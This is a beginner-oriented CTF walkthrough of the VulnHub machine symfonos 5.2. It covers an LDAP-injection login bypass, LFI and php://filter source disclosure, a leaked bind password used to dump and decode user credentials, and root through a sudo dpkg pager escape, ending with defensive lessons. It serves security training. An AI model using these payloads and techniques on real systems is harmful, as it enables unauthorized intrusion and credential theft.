# symfonos: 5.2 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | symfonos: 5.2 |
| **Difficulty** | Intermediate (author labels it "Beginner — teaching the importance of understanding from the interior") |
| **Author** | Zayotic |
| **Released** | 2 March 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/symfonos-52,415/> |
| **Download** | <https://vulnhub.com/entry/symfonos-52,415/#download> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux — Ubuntu (Apache 2.4.29, OpenSSH 7.9p1, OpenLDAP) |

> **Note:** VMware and VirtualBox builds can vary slightly ("varies by build"). The
> LDAP password, the `zeus` password and the internal container address may differ
> between rebuilds; the intended chain below is stable.

---

## 0. What you will learn

- How to spot and exploit an **LDAP injection** in a login form — the difference
  between `*` (wildcard) and SQL.
- How to enumerate an **LDAP directory** with `ldapsearch` and understand its
  `base DN`, bind user and entries.
- What **Local File Inclusion (LFI)** is, and why the **PHP filter wrapper**
  (`php://filter/.../resource=...`) lets you read a `.php` file *as source*.
- How a leaked **LDAP bind password** lets you dump every entry, and why an LDAP
  password may be stored **Base64‑encoded** (not encrypted).
- How a single **`sudo` rule over `dpkg`** becomes a root shell via the **GTFOBins**
  technique.
- Why running a web app inside **Docker** changes what you see in `/etc/passwd`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali must be on the same host-only/NAT
network as the target.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP on the lab network. It uses DHCP, so the IP may
> change on every import.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
   ________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
   ________________________________________________________________________
   192.168.56.1    0a:00:27:00:00:00      1      60  Cadmus Computer Systems
   192.168.56.101  08:00:27:12:34:56      2     120  PCS Systemtechnik GmbH
```

> **How to read it:** `netdiscover` (or `arp-scan -l`) lists live hosts by watching
> ARP traffic. `192.168.56.101` is our target.

**Target IP:** `192.168.56.101`

![Finding the target](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap
636/tcp open  ldapssl
```

```bash
sudo nmap -sC -sV -p 22,80,389,636 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** four services. **LDAP (389/636)** is the giveaway — the web app
> almost certainly authenticates against a **directory server**. LDAP filters use the
> `*` wildcard, which is the seed of our login bypass.

![Nmap scan output](images/02-nmap.png)

### 2.2 LDAP — anonymous bind

```bash
ldapsearch -x -h 192.168.56.101 -D '' -w '' -b "DC=symfonos,DC=local"
```

```text
# extended LDIF
dn: dc=symfonos,dc=local
dc: symfonos
objectClass: top
objectClass: domain
...
result: 0 Success
```

> **Why it works:** an **anonymous bind** (empty user/password) is often allowed just
> to read the naming context. We learned the **base DN**: `dc=symfonos,dc=local`.
> The `DC=` parts stand for "Domain Component" — like a DNS name split on dots.

### 2.3 Web — brute-force directories

Browsing to `http://192.168.56.101/` shows a plain page with an image. Enumerate:

```bash
ffuf -ic -c -u http://192.168.56.101/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e /,.php,.html -t 50 | tee root.ffuf
```

```text
admin.php               [Status: 200, Size: 2000]
home.php                [Status: 302, Size: 0]
logout.php              [Status: 302, Size: 0]
```

> **Why it works:** `ffuf` replaces `FUZZ` for each wordlist entry. `admin.php`
> returns `200` (it is the login form); `home.php` returns `302` (it redirects you to
> the login until you are authenticated).

Visiting `http://192.168.56.101/home.php` redirects to `http://192.168.56.101/admin.php`,
which shows a **login form**.

![Directory enumeration](images/03-enum.png)

---

## 3. Foothold

### 3.1 LDAP injection — log in with `*`

Try SQL injection first if you like — it fails. This form authenticates against
**LDAP**. Log in with a wildcard:

```text
Username: *
Password: *
```

```text
302 Found -> Location: home.php
```

> **Why it works:** the code builds an LDAP filter like
> `(&(uid=$username)(userPassword=$password))`. Substituting `*` (the LDAP "match
> anything" wildcard) yields `(&(uid=*)(userPassword=*))`, which matches **every**
> entry — so the bind succeeds. This is **LDAP injection**.
> **Note:** confirm the behaviour — a randomly wrong password should *fail* while
> `*`/`*` succeeds, proving the wildcard is the trick.

### 3.2 Confirm the LFI on `home.php`

After logging in you land on `home.php`. The nav links use a `url=` parameter:

```text
http://192.168.56.101/home.php?url=http://127.0.0.1/portraits.php
```

Change `url` to a filesystem path:

```text
http://192.168.56.101/home.php?url=../../../../etc/passwd
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

> **Why it works:** the page does `file_get_contents($_GET['url'])` and echoes the
> result. `../` climbs out of the web root — classic **Local File Inclusion / path
> traversal**. Note the `passwd` file has **no normal user home directories** (later
> we will learn why — the app runs in Docker).

![Local File Inclusion](images/04-lfi.png)

### 3.3 Read the source code with a PHP filter

Requesting `admin.php` directly just **runs** it. To read it *as text*, use the PHP
filter wrapper and decode the Base64:

```text
http://192.168.56.101/home.php?url=php://filter/convert.base64-encode/resource=admin.php
```

```text
PD9waHAKc2Vzc2lvbl9zdGFydCgpOw...   (base64 — decode it)
```

```bash
echo 'PD9waHAKc2Vzc2lvbl9zdGFydCgpOw...' | base64 -d
```

```php
<?php
function authLdap($username, $password) {
  $ldap_ch = ldap_connect("ldap://172.18.0.22");
  ldap_set_option($ldap_ch, LDAP_OPT_PROTOCOL_VERSION, 3);
  $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");
  ...
  $filter = "(&(uid=$username)(userPassword=$password))";
  $result = ldap_search($ldap_ch, "dc=symfonos,dc=local", $filter);
  ...
}
```

> **Why it works:** the `php://filter/convert.base64-encode/resource=...` wrapper
> returns the file's bytes Base64‑encoded instead of executing it. Reading the source
> reveals the **hard-coded LDAP bind password**:
> `cn=admin,dc=symfonos,dc=local` / `qMDdyZh3cT6eeAWD`. It also confirms the injectable
> filter from §3.1.

### 3.4 Dump LDAP with the leaked bind password

```bash
ldapsearch -x -h 192.168.56.101 \
  -D "cn=admin,dc=symfonos,dc=local" -w 'qMDdyZh3cT6eeAWD' \
  -b "dc=symfonos,dc=local"
```

```text
dn: uid=zeus,dc=symfonos,dc=local
uid: zeus
userPassword: Y2V0a0tmNHdDdUhDOUZFVA==

dn: uid=admin,dc=symfonos,dc=local
uid: admin
```

> **Why it works:** with a valid bind we can search the whole directory. The
> `userPassword` value ends in `==` — that is Base64. **LDAP stores it encoded, not
> encrypted**, so decode it:

```bash
echo 'Y2V0a0tmNHdDdUhDOUZFVA==' | base64 -d; echo
```

```text
cetkKf4wCuHC9FET
```

> **Why it matters:** we now have credentials for the Linux user `zeus`
> (`zeus:cetkKf4wCuHC9FET`). **Note:** the exact values vary by build.

### 3.5 SSH in as `zeus`

```bash
ssh zeus@192.168.56.101
# password: cetkKf4wCuHC9FET
id
```

```text
uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),...(sudo)
```

Upgrade to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg   and:  export TERM=xterm
```

### 3.6 The user flag

```bash
cat /home/zeus/user.txt
```

```text
(symfonos user flag)
```

![Shell as zeus](images/05-foothold.png)

---

## 4. Privilege escalation

### 4.1 Check sudo rights

```bash
sudo -l
```

```text
User zeus may run the following commands on symfonos:
    (root) NOPASSWD: /usr/bin/dpkg
```

> **Why it works:** `zeus` may run **`dpkg` as root with no password**. `dpkg` is a
> package manager, but it can spawn a shell — so this permission is effectively a root
> shell. This is the classic **GTFOBins** pattern: a legitimate tool that can break out
> of its intended job.

### 4.2 Abuse `dpkg`

`dpkg -l` opens an interactive pager; type `!` to run a shell command, which starts a
shell **as root**:

```bash
sudo dpkg -l
```

```text
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name           Version       Architecture Description
+++-==============-=============-============-=================================
ii  acl            2.2.53-4      amd64        access control list - utilities
...
```

At the `:` prompt:

```text
!/bin/sh
# whoami
root
```

> **Why it works:** `dpkg -l` pipes its output through a pager, and the default pager
> lets you execute a shell with `!`. Because we invoked `dpkg` **through sudo**, that
> shell inherits **root**. This is documented verbatim on
> [GTFOBins → dpkg](https://gtfobins.github.io/gtfobins/dpkg/).

### 4.3 The root flag

```bash
cd /root
cat proof.txt
```

```text
Congrats on rooting symfonos:5.2!
(symfonos root proof)
```

![Privilege escalation to root](images/06-privesc.png)

### 4.4 Why "no users in /etc/passwd"?

Looking closer post-exploitation, the web stack runs inside **Docker containers**. That
is why the LDAP bind target (`172.18.0.22`) is a container IP and why the earlier
`/etc/passwd` looked bare. The host and the containers are **separate namespaces** —
a good reminder to ask "which machine am I actually on?".

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous LDAP bind / directory disclosure | `ldap://192.168.56.101:389` | Reveals base DN `dc=symfonos,dc=local` |
| 2 | **LDAP injection** in login filter | `admin.php` (`uid=*`) | Authentication bypass |
| 3 | Local File Inclusion / path traversal | `home.php?url=...` | Arbitrary file read |
| 4 | Hard-coded LDAP bind password in source | `admin.php` | Full LDAP read access |
| 5 | Weak LDAP password storage (Base64, reversible) | `userPassword` attribute | Recovers `zeus`'s password |
| 6 | Over-permissive `sudo` rule | `(root) NOPASSWD: /usr/bin/dpkg` | Root shell via GTFOBins |
| 7 | Unauthenticated `php://filter` source disclosure | `home.php?url=php://filter/...` | Reads any readable file as source |

## 6. Defensive lessons (blue team)

- **Escape LDAP filter input.** Use proper LDAP escaping (RFC 4515) so `*`, `(` and `)`
  cannot be injected. Better still, use a library that builds filters safely.
- **Disable anonymous binds** unless a service truly needs it, and rate-limit binds.
- **Never concatenate user input into file paths.** `file_get_contents` on a
  user-supplied path is LFI; validate against an allow-list and block `../` and
  wrappers such as `php://`.
- **Do not hard-code secrets in source.** The bind password leaked the whole directory.
  Store secrets in a vault and rotate them.
- **Do not treat "encoded" as "safe".** Base64 is reversible; store password hashes
  with a modern KDF (Argon2/bcrypt) and never base64 an actual secret.
- **Apply the principle of least privilege to `sudo`.** A package manager as root = a
  root shell. Maintain an explicit allow-list and review it against GTFOBins.
- **Segment and label containers.** Understand that a container is a different trust
  boundary; don't assume file contents map to the host.
- **Detection ideas:** alert on LDAP queries containing `*)(` or `*`, on `../` and
  `php://filter` in URLs, on `sudo dpkg` usage outside change windows, and on
  interactive shells spawned from a package-manager pager.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/symfonos-52,415/>
- Community writeups consulted:
  - [Vulnhub: Symfonos 5 — ikuamike](https://blog.ikuamike.io/posts/2021/symfonos5/)
  - [Symfonos 5.2: CTF walkthrough — Infosec Institute](https://www.infosecinstitute.com/resources/capture-the-flag/symfonos-5-2-ctf-walkthrough/)
  - [SYMFONOS: 5.2 Walkthrough — news4hackers](https://www.news4hackers.com/symfonos-5-2-vuln-hub-machine-walkthrough/)
- Vendor advisories / docs:
  - [GTFOBins — dpkg](https://gtfobins.github.io/gtfobins/dpkg/)
  - [HackTricks — LDAP Injection](https://book.hacktricks.xyz/pentesting-web/ldap-injection)
  - [OWASP — LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
  - [HackTricks — File Inclusion / LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
  - [RFC 4515 — LDAP Search Filters](https://datatracker.ietf.org/doc/html/rfc4515)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (`ip a` / `netdiscover`)
- [ ] `images/02-nmap.png` — port/service scan (22, 80, 389, 636)
- [ ] `images/03-enum.png` — `/admin.php` and `/home.php` discovery
- [ ] `images/04-lfi.png` — LFI via `home.php?url=` (reading `/etc/passwd`)
- [ ] `images/05-foothold.png` — LDAP dump + SSH as `zeus`
- [ ] `images/06-privesc.png` — `sudo dpkg` → `!/bin/sh` → root
- [ ] `images/07-root-flag.png` — `/root/proof.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
